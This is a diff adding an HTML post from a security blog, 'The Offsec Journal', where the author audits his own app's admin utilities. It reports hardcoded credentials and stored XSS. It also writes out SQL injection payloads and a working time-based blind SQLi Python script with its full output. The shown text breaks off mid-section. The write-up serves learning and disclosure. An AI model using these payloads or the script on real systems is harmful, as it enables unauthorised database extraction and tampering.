@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="description" content="The Offsec Journal - My journey from a script kiddie to a security researcher">
+  <meta name="author" content="Aditya Bhardwaj">
+  
+  <title>The Offsec Journal</title>
+  
+  <link rel="stylesheet" href="/assets/css/pico.green.min.css">
+  <link rel="stylesheet" href="/assets/css/post.css">
+</head>
+
+<body>
+  <nav class="container">
+    <ul>
+      <li><strong>The Offsec Journal</strong></li>
+    </ul>
+    <ul>
+      <li><a href="/">Home</a></li>
+      <li><a href="/about.html">About</a></li>
+    </ul>
+  </nav>
+
+  <main class="container">
+    <article>
+      <!-- Post Header -->
+      <header>
+        <h1 id="bigtitle"></h1>
+        <div class="post-meta">
+          <time id="date"></time> 
+        </div>
+        <div id="tags"></div>
+      </header>
+    
+      <!-- Table of Contents -->
+      <aside class="toc">
+        <h3>Table of Contents</h3>
+        <ul id="toc_ul"></ul>
+      </aside>
+    
+      <!-- Introduction -->
+      <section>
+        <h2>Introduction</h2>
+
+        <p>Hi again!</p>
+
+        <p>I'm taking a look at the little admin utilities that I have throughout the app. I'm gonna say it—I think this one <i>just might</i> be a straightforward session: they're pretty much all just single files (as far as I remember), and there aren't too many of them.</p>
+
+        <p>I think I already have a fair idea of what might be wrong with them as well.</p>
+
+        <p>Let's go.</p>
+      </section><br>
+    
+      <!-- Planning -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+        
+        <p>As always, before I get started, let's convert those "fair" ideas into concrete ideas. We need a scope for today.</p>
+
+        <p>Many of these cheeky little utils are at the root of the app. They are:</p>
+
+        <ul>
+            <li><strong>users.php</strong> - this one's dangerous. Simple little HTML form. If you enter the right admin password (which I bet you is hardcoded lmao) then it'll go to the db and dump the entire <code>users</code> table for you.</li>
+            <li><strong>clear.php</strong> - this one's pretty wild too. Another HTML form—this one has a dropdown for you to pick a database table. Enter the right admin password and it'll literally DELETE EVERY ROW from that table for you. WHY??</li>
+            <li><strong>blacklist.php</strong> - this one's coming back because it writes to a file called <code>log.txt</code>, and we might be able to find a way to turn it into a side channel.</li>
+            <li><strong>conn.php</strong> - not technically an <i>admin</i> utility per se, but this is the file that gets <code>require()</code>'d by every file which interact with the database. It basically creates the PDO object that the other files use to run db queries. I wouldn't be surprised to find more hardcoded credentials lol, worth a look.</li>
+        </ul>
+
+        <p>Alrighty. <code>conn.php</code> looks the simplest right now, so we'll start from there. After that, we'll just go from the top of the list and work our way down. <code>users.php</code> and <code>clear.php</code> are honestly way too risky to even <i>exist</i>, but they're here for some reason lol, so let's see what I can do with em.</p>
+      </section><br>
+      
+      <!-- conn.php -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+                
+        <p>Pretty simple check here - main thing I'm looking for is hardcoded creds. Let's see...</p>
+
+        <p>Heh, ok, that was easy. This is the entire file:</p>
+
+        <pre><code>&lt;?php
+    $host = 'db.parity.nimbusdigital.org';
+    $username = 'parity';
+    $password = '(redacted)';
+    $database = 'parity';
+    $port = 5432;
+
+    try {
+        $conn = new PDO("pgsql:host=$host;dbname=$database;port=$port", $username, $password);
+        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+        if ($conn) {
+            //Pass
+        }
+    } catch (PDOException $error) {
+        die("Unable to connect to the database: ".$error->getMessage());
+    }
+?&gt;</code></pre>
+
+        <p>Same username and password that was in the WebSocket server too by the way lol. Awesome.</p>
+
+        <p>There's not much to this file other than that—nice little find to start off the day.</p>
+
+        <blockquote>Number of Findings Today: 1</blockquote>
+      </section><br>
+
+      <!-- users.php -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+        
+        <p>Ok, so here's what the password check looks like in this file:</p>
+
+        <pre><code>if (ISSET($_POST["pass"])) {
+    if ($_POST["pass"] === "(redacted)") {
+        ...</code></pre>
+
+        <p>Couple things I notice here.</p>
+
+        <p>First of all, the super-secret admin password is just hardcoded again. Wonderful. Of course it is lol. Oh, and it's the same as the database password, and every other hardcoded password we've found so far—if an attacker finds ONE of them, they now have full access here too.</p>
+
+        <p>Second of all, though: the password check itself actually isn't terrible! It's using <code>===</code> for strict type comparison so that takes out any type juggling BS we could've pulled there. It's not looking like there's any way we can force that comparison to equal <code>true</code> with a payload—the <code>===</code> is actually correctly implemented. But, of course, the password is the exact same as all the other passwords, so if an attacker finds it somewhere else, it wouldn't at all be unreasonable to assume that they might try it here too... That's a problem.</p>
+
+        <blockquote>Number of Findings Today: 2</blockquote>
+
+        <p>Y'know what, while I'm here anyway, I'm gonna go ahead and change all of the hardcoded passwords in this app to "redacted123"—just before I forget. It's a private repo right now, which is probably for the best, but I will be copying it over to a new public repo eventually so that you guys can see this absolutely WILD code as well. Redacting the password(s) is the only change I'll be making to it.</p>
+
+        <p>Done! Every hardcoded password or api key in there is now simply <code>redacted123</code> or just <code>(redacted)</code>. Updated the README too—now it has a warning/disclaimer at the top lol.</p>
+
+        <p>Ok, back to the ACTUAL task at hand. The next thing I see: remember how we learned when we were testing <code>index.php</code> that there's no input validation for what goes into the database? And how you can register users with names like <code>&lt;script&gt;alert("XSS")&lt;/script&gt;John</code>? Well that's gonna be a problem here:</p>
+
+        <pre><code>$query = "SELECT * FROM users";
+$data = $conn->query($query);
+  
+if ($data) {
+  foreach ($data as $row) {
+    echo $row['uname'].", ".$row['pass']."&lt;br&gt;&lt;br&gt;";
+  }
+}</code></pre>
+
+        <p>All of the usernames and passwords are being echoed into the file verbatim, meaning if XSS John did exist as a user, every admin that visits this file will be exposed to John's payload—this file is genuinely endangering everyone who knows the password.</p>
+
+        <p>Let's confirm that real quick...</p>
+
+        <video controls src="/assets/video/capstone/utils/xss-john.mp4"></video>
+
+        <p>Ain't that beautiful.</p>
+
+        <blockquote>Number of Findings Today: 3</blockquote>
+
+        <p>That's pretty much all of <code>users.php</code> done. Pretty small file. On to <code>clear.php</code> we go!</p>
+      </section><br>
+
+      <!-- clear.php -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+
+        <p>Just pulled up <code>clear.php</code> in my code editor, and what's the first damn thing I see?</p>
+
+        <pre><code>if ($_POST['pass'] === "(redacted)") {</code></pre>
+
+        <p>More hardcoded creds! And <i>still</i> the exact same ones! Spectacular.</p>
+
+        <blockquote>Number of Findings Today: 4</blockquote>
+
+        <p>Moving on, this one's an interesting file. There's this HTML form here:</p>
+
+        <pre><code>&lt;form method=&#39;POST&#39;&gt;
+    &lt;input type=&#39;password&#39; name=&#39;pass&#39; placeholder=&#39;Enter Admin Password&#39;/&gt;&lt;br&gt;&lt;br&gt;
+    &lt;select name=&#39;tbl&#39;&gt;
+        &lt;option value=&#39;empty&#39;&gt;(Select a table)&lt;/option&gt;
+        &lt;option value=&#39;users&#39;&gt;Users&lt;/option&gt;
+        &lt;option value=&#39;code&#39;&gt;Code&lt;/option&gt;
+        &lt;option value=&#39;general&#39;&gt;General&lt;/option&gt;
+        &lt;option value=&#39;offtopic&#39;&gt;Offtopic&lt;/option&gt;
+        &lt;option value=&#39;work&#39;&gt;Work&lt;/option&gt;
+    &lt;/select&gt;
+    &lt;input type=&#39;submit&#39;/&gt;
+&lt;/form&gt;</code></pre>
+
+        <p>That <code>tbl</code> POST parameter gets used in the PHP here:</p>
+
+        <pre><code>/* ... */
+require("./conn.php");
+$query = "DELETE FROM ".$_POST['tbl'];
+$data = $conn->query($query);
+
+if ($data) {
+    echo "Successfully cleared table:\n";
+    var_dump($data);
+}
+/* ... */</code></pre>
+
+        <p>Once again, zero input validation. But even more importantly, that query isn't being prepared, so there's real SQLi potential here through that <code>tbl</code> param.</p>
+
+        <p>It's inside of a <code>DELETE</code> statement, but our input is being appended right to the end, so I bet we could do something like <code>randomtablename; SELECT * FROM (whatever idk)</code>. The first query will fail because there's no such table as <code>randomtablename</code> of course, but the second query will still run—and we're literally <code>var_dump</code>ing the results of it right into the page.</p>
+
+        <p>Dang, so I basically built a whole SQL console by accident, huh? Let's try!</p>
+
+        <p>Ok, so this is what happens when I hit it with <code>whatever; SELECT version()</code>:</p>
+
+        <img src="/assets/img/capstone/utils/clearphperr.png">
+
+        <p>Alright, fair enough. Ok, I just gotta make the <code>DELETE</code> statement return something then. It's time for the return of the <code>RETURNING</code> clause lol, love that thing.</p>
+
+        <p>New payload: <code>users WHERE 1=0 RETURNING (SELECT version())</code></p>
+
+        <p>So then the full query becomes: <code>DELETE FROM users WHERE 1=0 RETURNING (SELECT version())</code>. Nothing actually gets deleted, <i>and</i> we get to make it kick back literally anything we want. Let's give that a shot...</p>
+
+        <video controls src="/assets/video/capstone/utils/clearsqli.mp4"></video>
+
+        <p>Ok, interesting. So clearly the query ran as intended, but we don't see any results here. Only the query string itself. Does that have to do with the fact that it's a DELETE statement somehow?</p>
+
+        <p>Oh lmao, I looked it up, this is kinda funny. We're <code>var_dump</code>ing the <code>$data</code> var, yes, but that's just a <code>PDOStatement</code> object, not the actual return data of the SQL query. The PDO query method we're using here returns false if the query failed, and a PDOStatement object if it was successful—you have to call <code>->fetch()</code> on it to actually get the data inside it.</p>
+
+        <p>So I found a genuine SQLi with a working exfil technique, but the app is so poorly written that it doesn't even read it's own query results lol.</p>
+
+        <p>Ok, well no problem then. Just makes things slightly more complex for us—since we've confirmed that SQLi is possible here, we could probably just do time-based blind. So like:</p>
+
+        <pre><code>users WHERE (SELECT CASE WHEN substring(version(),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END) IS NULL</code></pre>
+
+        <p>And then after that <code>WHEN substring(version(),1,1)='b'</code>, and then <code>WHEN substring(version(),1,1)='c'</code> and so on. Ideally we'd write like a python script or something to automate this. It really helps that there's no rate-limiting as well—it'd probably be pretty fast.</p>
+
+        <p>Just threw this together, gonna give it a shot:</p>
+
+        <pre><code>import requests
+import string
+import time
+
+url = "https://parity.nimbusdigital.org/clear.php"
+passwd = "redacted123"
+chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_.-: ()"
+
+print("Starting...")
+
+result = ""
+pos = 1
+
+while True:
+    found = False
+
+    for c in chars:
+        tbl = f"users WHERE (SELECT CASE WHEN substring(version(),{pos},1)='{c}' THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL"
+        start = time.time()
+        requests.post(url, data={"pass": passwd, "tbl": tbl})
+
+        if (time.time() - start) >= 3: # over our time threshold; we got one
+            result += c
+            print(f"Char at position {pos} = '{c}' : {result}")
+            found = True
+            break
+
+    if not found:
+        break
+
+    pos += 1
+
+print(f"Done! Result: {result}")</code></pre>
+
+        <p>I think this should work. Let's see...</p>
+
+        <video controls src="/assets/video/capstone/utils/timeblindsqli.mp4"></video>
+
+        <p>Aha! Check it out!</p>
+
+        <p>It's taking a little bit, I'm gonna let this run in the background. Once it's done, I'll put the full output in the little dropdown thing below:</p>
+
+        <blockquote><div id="tree">
+        <details>
+        <summary><strong>(Click to Reveal)</strong></summary>
+        <pre><code>$ python clearphp_time_blind.py 
+
+Starting...
+Char at position 1 = 'P' : P
+Char at position 2 = 'o' : Po
+Char at position 3 = 's' : Pos
+Char at position 4 = 't' : Post
+Char at position 5 = 'g' : Postg
+Char at position 6 = 'r' : Postgr
+Char at position 7 = 'e' : Postgre
+Char at position 8 = 'S' : PostgreS
+Char at position 9 = 'Q' : PostgreSQ
+Char at position 10 = 'L' : PostgreSQL
+Char at position 11 = ' ' : PostgreSQL 
+Char at position 12 = '1' : PostgreSQL 1
+Char at position 13 = '3' : PostgreSQL 13
+Char at position 14 = '.' : PostgreSQL 13.
+Char at position 15 = '2' : PostgreSQL 13.2
+Char at position 16 = '3' : PostgreSQL 13.23
+Char at position 17 = ' ' : PostgreSQL 13.23 
+Char at position 18 = '(' : PostgreSQL 13.23 (
+Char at position 19 = 'U' : PostgreSQL 13.23 (U
+Char at position 20 = 'b' : PostgreSQL 13.23 (Ub
+Char at position 21 = 'u' : PostgreSQL 13.23 (Ubu
+Char at position 22 = 'n' : PostgreSQL 13.23 (Ubun
+Char at position 23 = 't' : PostgreSQL 13.23 (Ubunt
+Char at position 24 = 'u' : PostgreSQL 13.23 (Ubuntu
+Char at position 25 = ' ' : PostgreSQL 13.23 (Ubuntu                                                                                                        
+Char at position 26 = '1' : PostgreSQL 13.23 (Ubuntu 1                                                                                                      
+Char at position 27 = '3' : PostgreSQL 13.23 (Ubuntu 13                                                                                                     
+Char at position 28 = '.' : PostgreSQL 13.23 (Ubuntu 13.                                                                                                    
+Char at position 29 = '2' : PostgreSQL 13.23 (Ubuntu 13.2                                                                                                   
+Char at position 30 = '3' : PostgreSQL 13.23 (Ubuntu 13.23                                                                                                  
+Char at position 31 = '-' : PostgreSQL 13.23 (Ubuntu 13.23-                                                                                                 
+Char at position 32 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1                                                                                                
+Char at position 33 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.                                                                                               
+Char at position 34 = 'p' : PostgreSQL 13.23 (Ubuntu 13.23-1.p                                                                                              
+Char at position 35 = 'g' : PostgreSQL 13.23 (Ubuntu 13.23-1.pg                                                                                             
+Char at position 36 = 'd' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgd                                                                                            
+Char at position 37 = 'g' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg                                                                                           
+Char at position 38 = '2' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg2                                                                                          
+Char at position 39 = '2' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22                                                                                         
+Char at position 40 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.
+Char at position 41 = '0' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.0
+Char at position 42 = '4' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04
+Char at position 43 = '+' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+
+Char at position 44 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1
+Char at position 45 = ')' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1)
+Char at position 46 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) 
+Char at position 47 = 'o' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) o
+Char at position 48 = 'n' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on
+Char at position 49 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on 
+Char at position 50 = 'x' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x
+Char at position 51 = '8' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x8
+Char at position 52 = '6' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86
+Char at position 53 = '_' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_
+Char at position 54 = '6' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_6
+Char at position 55 = '4' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64
+Char at position 56 = '-' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-
+Char at position 57 = 'p' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-p
+Char at position 58 = 'c' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc
+Char at position 59 = '-' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-
+Char at position 60 = 'l' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-l
+Char at position 61 = 'i' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-li
+Char at position 62 = 'n' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-lin
+Char at position 63 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linu
+Char at position 64 = 'x' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux
+Char at position 65 = '-' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-
+Char at position 66 = 'g' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-g
+Char at position 67 = 'n' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gn
+Char at position 68 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu
+Char at position 69 = ',' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu,
+Char at position 70 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, 
+Char at position 71 = 'c' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, c
+Char at position 72 = 'o' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, co
+Char at position 73 = 'm' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, com
+Char at position 74 = 'p' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, comp
+Char at position 75 = 'i' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compi
+Char at position 76 = 'l' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compil
+Char at position 77 = 'e' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compile
+Char at position 78 = 'd' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled
+Char at position 79 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled 
+Char at position 80 = 'b' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled b
+Char at position 81 = 'y' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by
+Char at position 82 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by 
+Char at position 83 = 'g' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by g
+Char at position 84 = 'c' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gc
+Char at position 85 = 'c' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc
+Char at position 86 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc 
+Char at position 87 = '(' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (
+Char at position 88 = 'U' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (U
+Char at position 89 = 'b' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ub
+Char at position 90 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubu
+Char at position 91 = 'n' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubun
+Char at position 92 = 't' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubunt
+Char at position 93 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu
+Char at position 94 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 
+Char at position 95 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 1
+Char at position 96 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11
+Char at position 97 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.
+Char at position 98 = '4' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4
+Char at position 99 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.
+Char at position 100 = '0' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0
+Char at position 101 = '-' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-
+Char at position 102 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1
+Char at position 103 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1u
+Char at position 104 = 'b' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ub
+Char at position 105 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubu
+Char at position 106 = 'n' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubun
+Char at position 107 = 't' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubunt
+Char at position 108 = 'u' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu
+Char at position 109 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1
+Char at position 110 = '~' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~
+Char at position 111 = '2' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~2
+Char at position 112 = '2' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22
+Char at position 113 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.
+Char at position 114 = '0' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.0
+Char at position 115 = '4' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04
+Char at position 116 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.
+Char at position 117 = '2' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2
+Char at position 118 = ')' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2)
+Char at position 119 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 
+Char at position 120 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 1
+Char at position 121 = '1' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11
+Char at position 122 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.
+Char at position 123 = '4' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4
+Char at position 124 = '.' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.
+Char at position 125 = '0' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0
+Char at position 126 = ',' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0,
+Char at position 127 = ' ' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 
+Char at position 128 = '6' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 6
+Char at position 129 = '4' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 64
+Char at position 130 = '-' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 64-
+Char at position 131 = 'b' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 64-b
+Char at position 132 = 'i' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 64-bi
+Char at position 133 = 't' : PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 64-bit
+Done! Result: PostgreSQL 13.23 (Ubuntu 13.23-1.pgdg22.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0, 64-bit</code></pre>
+</details></div></blockquote><br>
+
+        <p>And there we have it! The full version string of the PostgreSQL server.</p>
+
+        <img src="/assets/img/capstone/utils/pgsql_version_dump.png">
+
+        <p>Look, it's accurate too!</p>
+
+        <img src="/assets/img/capstone/utils/pgsql_version.png">
+
+        <blockquote>Number of Findings Today: 5</blockquote>
+      </section><br>
+
+      <!-- blacklist.php (again) -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+
+        <p>We've already covered a good bit of <code>blacklist.php</code> in the last one, with the funky self-XSS vuln. There are a good few more things that catch my eye with this, though—seeing as it's the only way I have to ban users, it's <i>really</i> poorly written lol.</p>
+
+        <p>First of all, the "ban" is literally just an act of redirecting you to <code>about:blank</code>. That's it. There's nothing more to it. Look:</p>
+
+        <pre><code>&lt;script&gt;
+    function Fingerprint(hasher){ /* ... */ } // generates a (ideally) unique fingerprint of this user's browser
+    window.onload = function() {
+        var fingerprint = new Fingerprint().get();
+        var list = []; // to blacklist someone, I'd have to edit this file and put (hardcode) blacklisted fingerprints here
+
+        if ((list.includes(fingerprint)) &amp;&amp; (![/* list of hardcoded whitelisted usernames */].includes("&lt;?=$_SESSION['Username']?&gt;"))) {
+            location.href='about:blank'
+        }
+
+        /* ... */
+    }
+&lt;/script&gt;</code></pre>
+
+        <p>The entire user ban logic is just a client-side script lol. Cute.</p>
+
